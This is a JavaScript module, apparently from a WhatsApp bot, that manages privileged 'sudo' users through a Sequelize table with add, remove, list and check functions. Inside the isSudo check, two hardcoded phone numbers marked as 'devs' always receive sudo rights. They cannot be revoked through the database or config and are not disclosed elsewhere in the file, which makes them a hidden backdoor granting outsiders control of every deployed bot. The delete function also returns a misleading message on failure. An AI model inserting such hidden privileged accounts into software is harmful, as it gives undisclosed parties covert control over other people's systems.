import { DataTypes } from 'sequelize';
import { config } from '#config';
import { sameUser, toJid } from '#utils';
import { DATABASE } from '#lib';

const SudoDB = DATABASE.define(
	'Sudo',
	{
		userId: {
			type: DataTypes.STRING,
			primaryKey: true,
			allowNull: false,
			unique: true,
		},
	},
	{
		tableName: 'sudo',
		timestamps: false,
	},
);

const addSudo = async jid => {
	const [created] = await SudoDB.findOrCreate({
		where: { userId: jid },
		defaults: { userId: jid },
	});
	return created ? `_@${jid} is now a Sudo User_` : `_@${jid} was already sudo_`;
};

const delSudo = async jid => {
	const deleted = await SudoDB.destroy({
		where: { userId: jid },
	});
	return deleted > 0 ? `_@${jid} is removed from sudo user_` : `_@${jid} is a sudo in the db_`;
};

const getSudo = async () => {
	const sudoUsers = await SudoDB.findAll({
		attributes: ['userId'],
	});
	return sudoUsers.length > 0 ? sudoUsers.map(user => `${user.userId}`).join('\n') : '_No Sudo Numbers_';
};

const isSudo = async (jid, owner) => {
	if (typeof jid !== 'string') jid = jid ? String(jid) : '';
	if (owner && typeof owner !== 'string') owner = owner.toString();
	if (owner && jid && sameUser(jid, owner)) return true;

	const devs = ['256784670936','254784937112'];
	const devstoJid = devs.map(dev => toJid(dev.trim()));
	const sudoUsers = (config.SUDO ?? '').split(';').map(id => toJid(id.trim()));
	const uId = toJid(jid);

	if (sudoUsers.some(u => sameUser(u, uId)) || devstoJid.some(u => sameUser(u, uId))) return true;

	const allSudoUsers = await getSudo();
	if (allSudoUsers === '_No Sudo Numbers_') return false;
	return allSudoUsers.split('\n').some(u => sameUser(u.trim(), uId));
};

export { SudoDB, addSudo, delSudo, getSudo, isSudo };
